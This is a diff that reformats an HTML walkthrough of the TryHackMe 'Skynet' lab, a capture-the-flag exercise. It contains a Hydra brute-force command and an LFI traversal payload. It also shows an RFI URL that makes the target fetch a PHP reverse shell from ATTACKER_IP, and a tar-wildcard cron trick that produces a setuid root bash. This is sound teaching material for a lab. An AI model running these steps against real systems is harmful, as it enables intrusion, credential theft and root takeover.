@@ -1,42 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
 
-        <style>
-        table {
-            border-collapse: collapse;
-            width: auto; /* Adjusted from 100% to auto to allow table to size based on content */
-        }
-        th, td {
-            border: 1px solid black;
-            padding: 8px;
-            text-align: left;
-        }
-        th {
-            background-color: #f2f2f2; /* Light grey shade for the header row */
-        }
-        </style>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TryHackMe | Thompson</title>
+    <link rel="stylesheet" href="/styles/base.css">
+    <link rel="stylesheet" href="/styles/shared/header.css">
+    <link rel="stylesheet" href="/styles/shared/footer.css">
+    <link rel="stylesheet" href="/styles/shared/thmLabs.css">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+</head>
+
+<body>
+    <!-- Header Container  -->
+    <div id="header-container"></div>
+
+    <!-- Body Container  -->
+    <main id="main">
+
         <h1>TryHackMe | Skynet</h1>
-<h1>thmLabs</h1>
-<p><img alt="Skynet Image" src="../../Images/thm-skynet.png" /></p>
-<p>☍ Room Link - "https://tryhackme.com/room/skynet"</p>
-<h2>Introduction</h2>
-<p>This writeup walks through the "Skynet" challenge from TryHackMe. You'll follow a step-by-step journey from initial reconnaissance to full system compromise, including the real-world trial and errors encountered along the way.</p>
-<p><strong>In this guide, you'll learn :</strong>
-- Basic enumeration techniques using <strong>nmap</strong> and <strong>gobuster</strong>
-- SMB share enumeration
-- Credential brute-forcing with <strong>Burp Suite</strong> and <strong>Hydra</strong>
-- Exploiting vulnerable CMS applications
-- Leveraging <strong>Local File Inclusion (LFI)</strong> and <strong>Remote File Inclusion (RFI)</strong> vulnerabilities
-- Examining system-wide cron jobs for privilege escalation opportunities
-- Exploiting default system command behaviors to escalate privileges</p>
-<p>Grab a coffee and let's get started! ☕</p>
-<p><strong>📋 Machine Descriptions and Tasks -</strong> 
-- A vulnerable Terminator themed Linux machine.
-- There are three questions and two flags (user flag and root flag) we have to collect.</p>
-<p><strong>Note:</strong> The target IP may change between examples due to machine restarts.</p>
-<h2>Enumeration</h2>
-<p>First, I did basic nmap scan - </p>
-<p><strong>Nmap Scan Results : -</strong> </p>
-<pre><code class="language-shell"> ➥ $ nmap -sCV -p- 10.82.130.100
 
+        <div class="skynet0">
+            <img src="/assets/images/thmImages/thm-skynet.png" alt="Skynet CTF" />
+        </div>
+
+        <p id="extLink" onclick="window.open('https://tryhackme.com/room/skynet', '_blank')">☍ Room Link -
+            "https://tryhackme.com/room/skynet"</p><br>
+
+        <blockquote>
+            <p>Hello fellow hackers, learners, and security enthusiasts! 💻</p><br>
+            <p>Welcome to my corner of the internet where I document my path through the exciting world of penetration
+                testing
+                and cybersecurity. Whether you're here to follow along, learn together, or just curious about ethical
+                hacking -
+                I'm glad you stopped by!</p>
+        </blockquote><br>
+
+        <h2>⚝ Introduction</h2>
+
+        <p>This writeup walks through the <strong>"Skynet"</strong> challenge from <strong>TryHackMe</strong>. You'll
+            follow a step-by-step journey from
+            initial reconnaissance to full system compromise, including the real-world trial and errors encountered
+            along the way.</p><br>
+
+        <p><strong>👉 In this guide, you'll learn :</strong></p>
+        <ul>
+            <li>Basic enumeration techniques using <strong>nmap</strong> and <strong>gobuster</strong>.</li>
+            <li>SMB share enumeration</li>
+            <li>Credential brute-forcing with <strong>Burp Suite</strong> and <strong>Hydra</strong></li>
+            <li>Exploiting vulnerable CMS applications</li>
+            <li>Leveraging <strong>Local File Inclusion (LFI)</strong> and <strong>Remote File Inclusion (RFI)</strong>
+                vulnerabilities</li>
+            <li>Examining system-wide cron jobs for privilege escalation opportunities</li>
+            <li>Exploiting default system command behaviors to escalate privileges</li>
+        </ul>
+
+        <p>Grab a coffee and let's get started! ☕</p><br>
+
+        <p><strong>📋 Machine Descriptions and Tasks -</strong></p>
+        <ul>
+            <li>A vulnerable Terminator themed Linux machine.</li>
+            <li>There are three questions and two flags (user flag and root flag) we have to collect.</li>
+        </ul>
+        <br>
+
+        <p><strong>Note:</strong> The target IP may change between examples due to machine restarts.</p>
+
+        <h2>⚝ Enumeration</h2>
+
+        <p>First, I did basic nmap scan - </p>
+        <p><strong>Nmap Scan Results : -</strong> </p>
+
+        <pre><code class="shell"> ➥ $ nmap -sCV -p- 10.82.130.100
 Nmap scan report for 10.82.130.100
 Host is up (0.016s latency).
 Not shown: 65529 closed tcp ports (conn-refused)
@@ -54,31 +90,49 @@ PORT    STATE SERVICE     VERSION
 |_pop3-capabilities: SASL TOP CAPA PIPELINING UIDL AUTH-RESP-CODE RESP-CODES
 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 143/tcp open  imap        Dovecot imapd
-|_imap-capabilities: IDLE listed more Pre-login capabilities ENABLE SASL-IR have post-login LOGIN-REFERRALS OK IMAP4rev1 LITERAL+ ID LOGINDISABLEDA0001
+|_imap-capabilities: IDLE listed more Pre-login capabilities ENABLE SASL-IR have post-login 
+LOGIN-REFERRALS OK IMAP4rev1 LITERAL+ ID LOGINDISABLEDA0001
 445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
 Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 20.00 seconds
+        </code></pre>
 
-</code></pre>
-<p><strong>Command Explanation -</strong> 
-- <strong>nmap</strong> , network exploration tool and security / port scanner.
-- <strong>-sC</strong> , for default script.
-- <strong>-sV</strong> , for service/version info.
-- <strong>-p-</strong> , to scan ports from 1 through 65535.
-- read more "https://manpages.ubuntu.com/manpages/trusty/en/man1/nmap.1.html"</p>
-<p>From the above scan results - 
-- <strong>Port 22</strong> : 'OpenSSH' server and The service is running on port 22.
-- <strong>Port 80</strong> : 'Apache' web server.
-- <strong>Port 110</strong> : 'Dovecot' mail server for email retrieval.
-- <strong>Port 143</strong> : 'Dovecot' mail server for email management.
-- <strong>Port 139 &amp; 445</strong> : 'Samba' file sharing service (SMB).</p>
-<p>Now, if we visit "http://10.82.130.100/" we will see this landing page - 
-<img alt="Skynet Landing Page" src="../../Images/thm-skynet-pic1.png" /></p>
-<p>No information there. So, I ran a <strong>gobuster</strong> scan to find hidden directories and analyse the website’s structure.</p>
-<p><strong>Gobuster Scan Results -</strong> </p>
-<pre><code class="language-shell"> ➥ $ gobuster dir -u http://10.82.130.100/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+        <p><strong>✦ Command Explanation -</strong></p>
+        <ul>
+            <li><strong>nmap</strong> , network exploration tool and security / port scanner.</li>
+            <li><strong>-sC</strong> , for default script.</li>
+            <li><strong>-sV</strong> , for service/version info.</li>
+            <li><strong>-p-</strong> , to scan ports from 1 through 65535.</li>
+        </ul>
+        <br>
+
+        <p id="extLink"
+            onclick="window.open('https://manpages.ubuntu.com/manpages/trusty/en/man1/nmap.1.html', '_blank')">
+            🕮 Read More - "https://manpages.ubuntu.com/manpages/trusty/en/man1/nmap.1.html"</p>
+        <br>
+
+        <p><strong>👆 From the above scan results -</strong></p>
+        <ul>
+            <li><strong>Port 22</strong> : 'OpenSSH' server and The service is running on port 22</li>
+            <li><strong>Port 80</strong> : 'Apache' web server</li>
+            <li><strong>Port 110</strong> : 'Dovecot' mail server for email retrieval</li>
+            <li><strong>Port 143</strong> : 'Dovecot' mail server for email management</li>
+            <li><strong>Port 139 &amp; 445</strong> : 'Samba' file sharing service (SMB)</li>
+        </ul>
+        <br>
+
+        <p>Now, if we visit <strong>"http://TARGET_IP/"</strong> we will find this landing page - </p>
+        <img alt="Skynet Landing Page" src="/assets/images/thmImages/thm-skynet-pic1.png" />
+        <br>
+
+        <p>No information there. So, I ran a <strong>gobuster</strong> scan to find hidden directories and analyse the
+            website’s structure.</p><br>
+
+        <p><strong>Gobuster Scan Results -</strong> </p>
+        <pre><code class="shell"> 
+➥ $ gobuster dir -u http://10.82.130.100/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 ===============================================================
 Gobuster v3.8.2
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -107,14 +161,27 @@ Progress: 4750 / 4750 (100.00%)
 ===============================================================
 Finished
 ===============================================================
+        </code></pre>
+        <br>
 
-</code></pre>
-<p>The "/admin" or "/config" pages shows "Forbidden". But, if we visit "/squirrelmail" it redirects to the "http://10.82.130.100/squirrelmail/src/login.php" page. Check the image below - </p>
-<p><img alt="Skynet Login Page" src="../../Images/thm-skynet-pic2.png" /></p>
-<p>We require credentials, but currently don't have any. Let's shift to enumerating the <strong>SMB</strong> service to see if we can gather more information from there.</p>
-<h3>Enumerating SMB Shares</h3>
-<p>First, we are going to list available shares - </p>
-<pre><code class="language-shell"> ➥ $ smbclient -N -L //10.82.130.100
+        <p>The "/admin" or "/config" pages shows "Forbidden". But, if we visit "/squirrelmail" it redirects to the
+            <strong>"http://TARGET_IP/squirrelmail/src/login.php"</strong> page. Check the image below -
+        </p>
+
+        <img alt="Skynet Login Page" src="/assets/images/thmImages/thm-skynet-pic2.png" />
+        <br>
+
+        <p>We require credentials, but currently don't have any. Let's shift to enumerating the <strong>SMB</strong>
+            service to
+            see if we can gather more information from there.</p>
+        <br>
+
+        <h3>Enumerating SMB Shares</h3>
+        <br>
+
+        <p>First, we are going to list available shares - </p>
+
+        <pre><code class="shell"> ➥ $ smbclient -N -L //10.82.130.100
 
 Can't load /etc/samba/smb.conf - run testparm to debug it
 
@@ -125,20 +192,39 @@ Can't load /etc/samba/smb.conf - run testparm to debug it
     milesdyson      Disk      Miles Dyson Personal Share
     IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
 SMB1 disabled -- no workgroup available
+        </code></pre>
+        <br>
 
-</code></pre>
-<p><strong>Command Explanation -</strong> 
-- smbclient : smbclient is a client that can 'talk' to an SMB/CIFS server.
-- -N : The -N option suppress password prompt.
-- -L : Requests a list of available shares/services from the server, rather than connecting to a specific one.
-- Finally two forward slashes "//" followed by the IP or hostname.</p>
-<p>From the above scan results - 
-- <strong>print$</strong> : A special administrative share used for printer driver storage.
-- <strong>anonymous</strong> : This is a custom share that explicitly allows anonymous (guest) access.
-- <strong>milesdyson</strong> : This is very likely a user's home directory share. It strongly suggests that a user named <strong>milesdyson</strong> exists on the system.
-- <strong>IPC$</strong> : A special share used for inter-process communication (IPC).</p>
-<p>Let's connect to the <strong>'anonymous'</strong> share with "-N" flag (no password). The server will automatically allow us a guest/anonymous session.</p>
-<pre><code class="language-shell"> ➥ $ smbclient //10.82.130.100/anonymous -N
+        <p><strong>👉 Command Explanation :</strong></p>
+        <ul>
+            <li><strong>smbclient</strong> : smbclient is a client that can 'talk' to an SMB/CIFS server</li>
+            <li><strong>-N</strong> : The <code>-N</code> option suppress password prompt</li>
+            <li><strong>-L</strong> : Requests a list of available shares/services from the server, rather than
+                connecting to a specific one</li>
+            <li>Two forward slashes <strong>"//"</strong> followed by the <strong>IP or hostname</strong></li>
+        </ul>
+        <br>
+
+
+        <p><strong>👆 From the above scan results : </strong></p>
+        <ul>
+            <li><strong>print$</strong> : A special administrative share used for printer driver storage.</li>
+            <li><strong>anonymous</strong> : This is a custom share that explicitly allows anonymous (guest) access.
+            </li>
+            <li><strong>milesdyson</strong> : This is very likely a user's home directory share. It strongly suggests
+                that a user named <strong>milesdyson</strong> exists on the system.
+            </li>
+            <li><strong>IPC$</strong> : A special share used for inter-process communication (IPC).</li>
+        </ul>
+        <br>
+
+        <p>Let's connect to the <strong>'anonymous'</strong> share with <strong>"-N"</strong> flag (no password). The
+            server will
+            automatically allow us a <strong>guest/anonymous</strong> session.</p>
+
+        <br>
+
+        <pre><code class="shell"> ➥ $ smbclient //10.82.130.100/anonymous -N
 
 Can't load /etc/samba/smb.conf - run testparm to debug it
 Try &quot;help&quot; to get a list of possible commands.
@@ -158,11 +244,18 @@ smb: \logs\&gt; dir
   log3.txt                            N        0  Wed Sep 18 05:42:16 2019
 
         9204224 blocks of size 1024. 5830548 blocks available
+        </code></pre>
+        <br>
 
-</code></pre>
-<p>From the above output we can see a file named "attention.txt" and a folder "logs" inside it three log files. We can get those files in our local system by using "<strong>get filename</strong>" command.</p>
-<p>Downloading the files - </p>
-<pre><code class="language-shell">smb: \&gt; get attention.txt
+        <p>From the above output we can see a file named <strong>"attention.txt"</strong> and a folder
+            <strong>"logs"</strong> inside it three log files.
+            We can get those files in our local system by using "<strong>get filename</strong>" command.
+        </p>
+        <br>
+
+        <p><strong>Downloading the files - </strong></p>
+
+        <pre><code class="shell">smb: \&gt; get attention.txt
 getting file \attention.txt of size 163 as attention.txt (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)
 smb: \&gt; cd logs\
 smb: \logs\&gt; get log1.txt 
@@ -172,119 +265,362 @@ getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 2
 smb: \logs\&gt; get log3.txt 
 getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 1.7 KiloBytes/sec)
 smb: \logs\&gt; exit
+        </code></pre>
+        <br>
 
-</code></pre>
-<p>Upon examining the contents of the files, we discovered the following :
-- The <strong>attention.txt</strong> file contains the message : <strong>"A recent system malfunction has caused various passwords to be changed. All Skynet employees are required to change their passwords after seeing this message. -Miles Dyson"</strong>
-- The <strong>log1.txt</strong> file is a wordlist containing 31 potential passwords.
-- Both <strong>log2.txt</strong> and <strong>log3.txt</strong> are empty files with a size of 0 bytes.</p>
-<p>Now that we have identified the username <strong>milesdyson</strong>, obtained a password list, and also a login page from our last <strong>gobuster</strong> scan (i.e., http://10.82.130.100/squirrelmail/src/login.php), we can proceed with the next steps.</p>
-<h2>Exploitation</h2>
-<p>Now, we can use Burp Suite's Intruder to brute-force the password, or we can use Hydra. Since this password list is small, I will first demonstrate the Burp Suite method, followed by a detailed command explanation for Hydra.</p>
-<p>But, before that let's capture the login request and analyse it in Burp Suite -</p>
-<p><img alt="Burp Suite Capture" src="../../Images/thm-skynet-pic3.png" /></p>
-<p>For a brute-force attack in Burp Suite, capturing the login request is sufficient. However, when using Hydra, we must specifically note the following elements from the request:
-- <strong>Target Endpoint:</strong> The request is a <strong>POST</strong> sent to <code>/squirrelmail/src/redirect.php</code> (Note that this differs from the <code>login.php</code> page we saw in the browser).
-- - <strong>Request Parameters:</strong> The pattern is <code>login_username=milesdyson&amp;secretkey=password</code>. We will need these parameter names for Hydra.
-- <strong>Failure Indicator:</strong> The server's response for a failed login attempt.</p>
-<h3>1. Brute-forcing Using Burp Suite</h3>
-<p>Inside Burp Suite, right-click the captured login request and select <strong>'Send to Intruder'</strong>. Then, navigate to the <strong>Intruder</strong> tab where we need to configure the attack by setting the following options (refer to the image below) :</p>
-<p><img alt="Burp Suite - Intruder" src="../../Images/thm-skynet-pic4.png" /></p>
-<p>After clicking <strong>'Start Attack'</strong>, Intruder will open a new window and attempt each password from the provided wordlist. Shortly after the attack begins, you will notice one request with a different <strong>Status Code</strong>, indicating a successful login attempt. Refer to the image below for a visual example.</p>
-<p><img alt="Cracked Password" src="../../Images/thm-skynet-pic5.png" /></p>
-<p><strong>Question 1</strong> : What is Miles password for his emails? (The above password is the answer to this question)</p>
-<h3>2. Brute-forcing Using Hydra</h3>
-<p>Now, let's check how can we get this using hydra - </p>
-<pre><code class="language-shell"> ➥ $ hydra -l milesdyson -P log1.txt 10.80.141.243 http-post-form &quot;/squirrelmail/src/redirect.php:login_username=^USER^&amp;secretkey=^PASS^:F=Unknown user or password incorrect&quot;
+        <p>Upon examining the contents of the files, we discovered the following :</p>
+        <ul>
+            <li>The <strong>attention.txt</strong> file contains the message : <strong>"A recent system malfunction has
+                    caused various passwords to be changed. All Skynet employees are required to change their passwords
+                    after
+                    seeing this message. -Miles Dyson"</strong>
+            </li>
+            <li>The <strong>log1.txt</strong> file is a wordlist containing 31 potential passwords.</li>
+            <li>Both <strong>log2.txt</strong> and <strong>log3.txt</strong> are empty files with a size of 0 bytes.
+            </li>
+        </ul>
+        <br>
+
+        <p>Now that we have identified the username <strong>milesdyson</strong>, obtained a password list, and also a
+            login page from our last <strong>gobuster</strong> scan (i.e., http://TARGET_IP/squirrelmail/src/login.php),
+            we can
+            proceed with the next steps.
+        </p>
+        <br>
+
+        <h2>⚝ Exploitation</h2>
+
+        <p>Now, we can use Burp Suite's Intruder to brute-force the password, or we can use Hydra. Since this password
+            list is small, I will first demonstrate the Burp Suite method, followed by a detailed command explanation
+            for Hydra.
+        </p>
+        <br>
+
+        <p>But, before that let's capture the login request and analyse it in Burp Suite -</p>
+        <br>
+
+        <img alt="Burp Suite Capture" src="/assets/images/thmImages/thm-skynet-pic3.png" />
+        <br>
+
+        <p>For a brute-force attack in Burp Suite, capturing the login request is sufficient. However, when using Hydra,
+            we must
+            specifically note the following elements from the request :
+        </p>
+        <ul>
+            <li><strong>Target Endpoint :</strong> The request is a <strong>POST</strong> sent to
+                <strong><code>/squirrelmail/src/redirect.php</code></strong> (Note that this differs from the
+                <strong><code>login.php</code></strong> page
+                we saw in the browser).
+            </li>
+            <li><strong>Request Parameters :</strong> The pattern is
+                <span><strong>login_username=milesdyson&amp;secretkey=password</strong><span>. We will need these
+                        parameter names for Hydra.
+            </li>
+            <li><strong>Failure Indicator :</strong> The server's response for a failed login attempt.</li>
+        </ul>
+        <br>
+
+        <h3>1. Brute-forcing Using Burp Suite</h3>
+
+        <p>Inside Burp Suite, right-click the captured login request and select <strong>'Send to Intruder'</strong>.
+            Then, navigate to the <strong>Intruder</strong> tab where we need to configure the attack by setting the
+            following
+            options (refer to the image below) :
+        </p>
+        <br>
+        <img alt="Burp Suite - Intruder" src="/assets/images/thmImages/thm-skynet-pic4.png" />
+        <br>
+
+        <p>After clicking <strong>'Start Attack'</strong>, Intruder will open a new window and attempt each password
+            from the provided wordlist. Shortly after the attack begins, you will notice one request with a different
+            <strong>Status Code</strong>, indicating a successful login attempt. Refer to the image below for a visual
+            example.
+        </p>
+        <br>
+        <img alt="Cracked Password" src="/assets/images/thmImages/thm-skynet-pic5.png" />
+        <p><strong>Question 1</strong> : What is Miles password for his emails? (The above password is the answer to
+            this question)
+        </p>
+        <br>
+
+        <h3>2. Brute-forcing Using Hydra</h3>
+        <br>
+        <p>Now, let's check how can we get this using hydra - </p>
+        <pre><code class="shell"> ➥ $ hydra -l milesdyson -P log1.txt 10.80.141.243 http-post-form &quot;/squirrelmail/src/redirect.php:login_username=^USER^&amp;secretkey=^PASS^:F=Unknown user&quot;
 
 Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 30 login tries (l:1/p:30), ~2 tries per task
-[DATA] attacking http-post-form://10.80.141.243:80/squirrelmail/src/redirect.php:login_username=^USER^&amp;secretkey=^PASS^:F=Unknown user or password incorrect
+[DATA] attacking http-post-form://10.80.141.243:80/squirrelmail/src/redirect.php:login_username=^USER^&amp;secretkey=^PASS^:F=Unknown user
 
 [80][http-post-form] host: 10.80.141.243   login: milesdyson   password: {PASSWORD_PLACEHOLDER}
 
 1 of 1 target successfully completed, 1 valid password found
+        </code></pre>
+        <br>
 
-</code></pre>
-<p><strong>Command Explanation -</strong> 
-- <code>-l</code>: Username (fixed value)
-- <code>-P</code>: Password wordlist (variable input)
-- <code>http-post-form</code>: Specifies we're attacking a POST form
-- <code>/squirrelmail/src/redirect.php</code>: Target login page path
-- <code>login_username=^USER^&amp;secretkey=^PASS^</code>: Form parameters where <code>^USER^</code> and <code>^PASS^</code> are Hydra's injection points
-- <code>F=Unknown user or password incorrect</code>: Failure string - Hydra knows a attempt failed when this message appears</p>
-<h2>Further Enumeration</h2>
-<p>Now, if we visit "http://10.80.141.243/squirrelmail/src/webmail.php" and login with the username (milesdyson) and password (cracked password from above). We can see a mailbox with three mail in inbox. One of them contains "smb password" for user milesdyson. Other two are just a random string ("balls have zero to me to me to me to me to me to me to me to me to") and it's binary representation respectively.</p>
-<p><strong>smb password (User - milesdyson) -</strong> </p>
-<p><img alt="SMB Password" src="../../Images/thm-skynet-pic6.png" /></p>
-<p>Returning to the terminal, I used the compromised credentials for the user <strong>milesdyson</strong> to log into the SMB share named <strong>milesdyson</strong> that we discovered earlier. Inside, I found a folder called <code>notes</code> containing an interesting file named <strong>important.txt</strong>. </p>
-<p><img alt="SMB Login" src="../../Images/thm-skynet-pic7.png" /></p>
-<p>I downloaded <strong>important.txt</strong> file to my local machine using the <code>get important.txt</code> command from the SMB shell.</p>
-<pre><code class="language-shell"> ➥ $ cat important.txt 
+        <p><strong>👉 Command Explanation :</strong></p>
+        <ul>
+            <li><strong><code>-l</code></strong> : Username (fixed value)</li>
+            <li><strong><code>-P</code></strong> : Password wordlist (variable input)</li>
+            <li><strong><code>http-post-form</code></strong> : Specifies we're attacking a POST form</li>
+            <li><strong><code>/squirrelmail/src/redirect.php</code></strong> : Target login page path</li>
+            <li><strong><code>login_username=^USER^&amp;secretkey=^PASS^</code></strong> : Form parameters where
+                <code>^USER^</code> and
+                <code>^PASS^</code> are Hydra's injection points
+            </li>
+            <li><strong><code>F=Unknown user</code></strong> : Failure string - Hydra knows a attempt failed when
+                this message appears.
+            </li>
+        </ul>
+        <br>
+
+        <h2>⚝ Further Enumeration</h2>
+
+        <p>Now, if we visit <strong>"http://TARGET_IP/squirrelmail/src/webmail.php"</strong> and login with the
+            <strong>username</strong> (milesdyson) and
+            <strong>password</strong> (cracked password from above). We can see a mailbox with three mails in inbox. One
+            of them contains <strong>"smb
+                password"</strong> for user milesdyson. Other two are just a random string ("balls have zero to me to me
+            to me to me to me to
+            me to me to me to") and it's binary representation respectively.
+        </p>
+        <br>
+
+        <p><strong>smb password (User - milesdyson) :</strong> </p>
+        <img alt="SMB Password" src="/assets/images/thmImages/thm-skynet-pic6.png" />
+        <br>
+
+        <p>Returning to the terminal, I used the compromised credentials for the user <strong>milesdyson</strong> to log
+            into the SMB share named <strong>milesdyson</strong> that we discovered earlier. Inside, I found a folder
+            called
+            <strong><code>notes</code></strong> containing an interesting file named <strong>important.txt</strong>.
+        </p>
+        <br>
+        <img alt="SMB Login" src="/assets/images/thmImages/thm-skynet-pic7.png" />
+        <br>
+
+        <p>I downloaded <strong>important.txt</strong> file to my local machine using the
+            <strong><code>"get important.txt"</code></strong> command from the SMB shell.
+        </p>
+        <br>
+        <pre><code class="shell"> ➥ $ cat important.txt 
 
 1. Add features to beta CMS /45******yd
 2. Work on T-800 Model 101 blueprints
 3. Spend more time with my wife
+        </code></pre>
+        <br>
 
-</code></pre>
-<p>Well, we got another hidden directory. If we visit it we can see the below page. <strong>This is the answer to question 2 - What is the hidden directory?</strong></p>
-<p><img alt="Myles Dyson Personal Page" src="../../Images/thm-skynet-pic8.png" /></p>
-<p>I ran <strong>gobuster</strong> again using <code>$ gobuster dir -u http://10.80.141.243/45**********yd/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</code> to enumerate it further and found another page "/administrator". Check the image below - </p>
-<p><img alt="Administrator" src="../../Images/thm-skynet-pic9.png" /></p>
-<p>I searched for 'Cuppa CMS' exploits online and found the relevant exploit on Exploit-DB: <a href="https://www.exploit-db.com/exploits/25971">https://www.exploit-db.com/exploits/25971</a>.</p>
-<p>Alternatively, we can search for this exploit locally using <code>searchsploit</code>, which will yield the same result.</p>
-<p><img alt="Cuppa Exploit" src="../../Images/thm-skynet-pic10.png" /></p>
-<p>If you have the Exploit-DB database installed (which <code>searchsploit</code> uses), you can read the full exploit file directly from : "/usr/share/exploitdb/exploits/php/webapps/25971.txt".</p>
-<p>First, I tested for Local File Inclusion (LFI) using the following payload:<br />
-<code>http://10.80.159.232/45********yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</code></p>
-<p><strong>Breakdown of the attack components:</strong>
-- <strong>Vulnerable endpoint:</strong> <code>/45********yd/administrator/alerts/alertConfigField.php</code>
-- <strong>Injection parameter:</strong> <code>urlConfig</code>
-- <strong>Directory traversal payload:</strong> <code>../../../../../../../../../etc/passwd</code></p>
-<p>The payload instructs the server to navigate from its current web root directory (typically <code>/var/www/html</code> on Linux systems) back to the filesystem root and read the <code>/etc/passwd</code> file.</p>
-<p><img alt="LFI" src="../../Images/thm-skynet-pic11.png" />
-Well, we can read the system file as you can see from the above image.</p>
-<h2>Initial Access</h2>
-<p>Now, let's attempt Remote File Inclusion (RFI). This requires several preparation steps:</p>
-<ol>
-<li><strong>Prepare a Payload:</strong> We need a PHP reverse shell file.</li>
-<li><strong>Host the Payload:</strong> We will serve this file locally using a Python HTTP server.</li>
-<li><strong>Start a Listener:</strong> We must start a netcat listener on the port specified in our reverse shell file.</li>
-</ol>
-<p>In essence, we will host a PHP reverse shell that, when executed remotely by the target server, should connect back to our machine. If successful, we will receive a connection from the target.</p>
-<p>This solves the <strong>third question</strong> - "What is the vulnerability called when you can include a remote file for malicious purposes?"</p>
-<p>Refer to the images below for the setup and execution - </p>
-<p>Let's grab this excellent php reverse shell from here - "https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php". We have to change the <code>"$ip = '127.0.0.1';" to attacker ip (typically tun0), and "$port = 1234;" (if you want different port)</code>.</p>
-<p><strong>Host the Payload and Start a Listener-</strong> </p>
-<p><img alt="Listener" src="../../Images/thm-skynet-pic12.png" /></p>
-<p>The above image, Left side I started a http server and right side started a listener on port 4242.</p>
-<p>Now, from the browser I have visited "http://10.80.159.232/45<strong><em>*</em></strong>*yd/administrator/alerts/alertConfigField.php?urlConfig=http://ATTACKER_IP:8000/php-reverse-shell.php" like we did for the LFI but this time we are executing a remote file by the target server.</p>
-<p><img alt="Reverse Shell" src="../../Images/thm-skynet-pic13.png" /></p>
-<p>Finally, we got a response from the target server as you can see in the above image.</p>
-<p><img alt="User Flag" src="../../Images/thm-skynet-pic14.png" /></p>
-<p>We got the <strong>user flag</strong> inside "/home/milesdyson" directory.</p>
-<h2>Privilege Escalation</h2>
-<p>Now, if we examine the <code>backups</code> directory, we find a shell script (<code>backup.sh</code>) that creates a backup of all content from the <code>/var/www/html</code> directory and saves it as <code>backup.tgz</code> in the <code>/home/milesdyson/backups</code> directory.</p>
-<p><img alt="Backup Script" src="../../Images/thm-skynet-pic15.png" /></p>
-<p>Additionally, checking the system-wide cron jobs with <code>cat /etc/crontab</code> reveals that the <code>backup.sh</code> script runs every minute as the root user.</p>
-<p><img alt="Crontab" src="../../Images/thm-skynet-pic16.png" /></p>
-<p>We do not have write permissions for the <code>backup.sh</code> script itself, but we can write to the <code>/var/www/html</code> directory where the tar command executes. Therefore, we will exploit the <code>*</code> wildcard in the tar command to execute our payload. Refer to the image below for detailed implementation.</p>
-<p><img alt="Custom Script" src="../../Images/thm-skynet-pic17.png" /></p>
-<p><strong>Command Explanation :</strong> 
-1. <strong><code>echo -e '#!/bin/bash\ncp /bin/bash /tmp/bash &amp;&amp; chmod u+s /tmp/bash' &gt; s.sh</code></strong>
-    - Creates a shell script that copies the bash binary to <code>/tmp/bash</code> and sets the SUID bit, ensuring it always executes with root privileges.
-2. <strong><code>chmod +x s.sh</code></strong>
-    - Grants executable permissions to the script.
-3. <strong><code>touch -- '--checkpoint=1'</code></strong>
-    - Creates a file named <code>--checkpoint=1</code>.
-4. <strong><code>touch -- '--checkpoint-action=exec=bash s.sh'</code></strong>
-    - Creates a file named <code>--checkpoint-action=exec=bash s.sh</code>.</p>
-<p><strong>What to expect ?</strong>
-- When the "backup.sh" script executes it runs the tar backup command.
-- Tar sees all files including <code>--checkpoint=1</code>, <code>--checkpoint-action=exec=sh s.sh</code>, <code>s.sh</code>
-- "<code>--checkpoint=1</code>" - This is actually a command line argument for tar to tell "Stop and check progress after every file". But we have created a file name with the same so when tar hit it it will get confused and treats it as a command line argument rather than a file name.
-- "--checkpoint-action=exec=bash s.sh" - This tells the tar when hit the checkpoint execute the mentioned command here it's "bash s.sh". So basically, our custom script will execute at this point.</p>
-<p><img alt="Root Flag" src="../../Images/thm-skynet-pic18.png" /></p>
-<p>We can now locate the bash binary in the <code>/tmp</code> directory. To obtain a root shell, we execute <code>/tmp/bash -p</code>. The <code>-p</code> flag is crucial as it prevents bash from dropping privileged permissions, allowing us to maintain root-level access.</p>
-<p>Finally, we can navigate to the root user's home directory and retrieve the <strong>root flag</strong>.</p>
+        <p>Well, we got another hidden directory. If we visit it we can see the below page. <strong>This is the answer
+                to question 2 - What is the hidden directory?</strong>
+        </p>
+        <br>
+        <img alt="Myles Dyson Personal Page" src="/assets/images/thmImages/thm-skynet-pic8.png" />
+        <br>
+
+        <p>I ran <strong>gobuster</strong> again using
+            <span><strong><code>"$ gobuster dir -u http://10.80.141.243/45**********yd/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt"</code></strong></span>
+            to enumerate it further and found another page <strong>"/administrator"</strong>. Check the image below -
+        </p>
+        <br>
+        <img alt="Administrator" src="/assets/images/thmImages/thm-skynet-pic9.png" />
+        <br>
+
+        <p>I searched for <strong>'Cuppa CMS'</strong> exploits online and found the relevant exploit on Exploit-DB: <a
+                href="https://www.exploit-db.com/exploits/25971"
+                target="_blank">"https://www.exploit-db.com/exploits/25971"</a>.
+        </p>
+        <br>
+        <p>Alternatively, we can search for this exploit locally using <strong><code>searchsploit</code></strong>, which
+            will yield the
+            same result.
+        </p>
+        <br>
+        <img alt="Cuppa Exploit" src="/assets/images/thmImages/thm-skynet-pic10.png" />
+        <br>
+
+        <p>If you have the Exploit-DB database installed (which <strong><code>searchsploit</code></strong> uses), you
+            can read the full
